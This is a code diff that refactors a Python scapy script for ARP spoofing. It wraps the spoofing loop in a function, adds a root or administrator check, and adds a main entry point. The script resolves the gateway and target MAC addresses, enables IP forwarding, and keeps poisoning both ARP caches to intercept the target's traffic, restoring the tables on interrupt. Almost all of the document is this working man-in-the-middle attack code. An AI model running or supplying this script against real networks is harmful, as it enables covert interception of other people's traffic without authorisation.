@@ -1,8 +1,10 @@
+import ctypes
+
 import scapy.all as scapy
 import argparse
 import network
 import time
-
+import os
 
 def parse_arguments():
     parser = argparse.ArgumentParser()
@@ -43,36 +45,51 @@ def restore(target_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-arguments = parse_arguments()
+def arp_spoofing(target):
+    # Check the current net config to get the gateway info
+    network_commands = network.NetworkCommands()
+    ip_gateway = network_commands.find_gateway()
+    mac_gateway = request_mac(ip_gateway)
 
-# Check the current net config to get the gateway info
-network_commands = network.NetworkCommands()
-ip_gateway = network_commands.find_gateway()
-mac_gateway = request_mac(ip_gateway)
+    print("[+] Default gateway is", ip_gateway, "with", mac_gateway)
 
-print("[+] Default gateway is", ip_gateway, "with", mac_gateway)
+    # Get Target info
+    mac_target = request_mac(target)
 
-# Get Target info
-mac_target = request_mac(arguments.target)
+    print("[+] Target is", target, "with", mac_target)
 
-print("[+] Target is", arguments.target, "with", mac_target)
+    network_commands.set_ipv4_forwarding(True)
 
-network_commands.set_ipv4_forwarding(True)
+    try:
+        arp_counter = 0
+        while True:
+            spoof(ip_gateway, target, target_mac=mac_gateway)
+            spoof(target, ip_gateway, target_mac=mac_target)
 
-try:
-    arp_counter = 0
-    while True:
-        spoof(ip_gateway, arguments.target, target_mac=mac_gateway)
-        spoof(arguments.target, ip_gateway, target_mac=mac_target)
+            arp_counter += 2
 
-        arp_counter += 2
+            print("\r[+] Send ARP " + str(arp_counter), end=" ", flush=True)
 
-        print("\r[+] Send ARP " + str(arp_counter), end=" ", flush=True)
+            time.sleep(2)
 
-        time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[-] Detected CTRL + C ... Resetting ARP tables")
+        network_commands.set_ipv4_forwarding(False)
+        restore(ip_gateway, target)
+        restore(target, ip_gateway)
 
-except KeyboardInterrupt:
-    print("\n[-] Detected CTRL + C ... Resetting ARP tables")
-    network_commands.set_ipv4_forwarding(False)
-    restore(ip_gateway, arguments.target)
-    restore(arguments.target, ip_gateway)
+
+def has_sudo_or_admin_rights():
+    try:
+        is_admin = os.getuid() == 0
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+
+    return is_admin
+
+
+if __name__ == "__main__":
+    arguments = parse_arguments()
+    if not has_sudo_or_admin_rights():
+        print("[-]", "No sudo/admin rights!")
+    arp_spoofing(arguments.target)
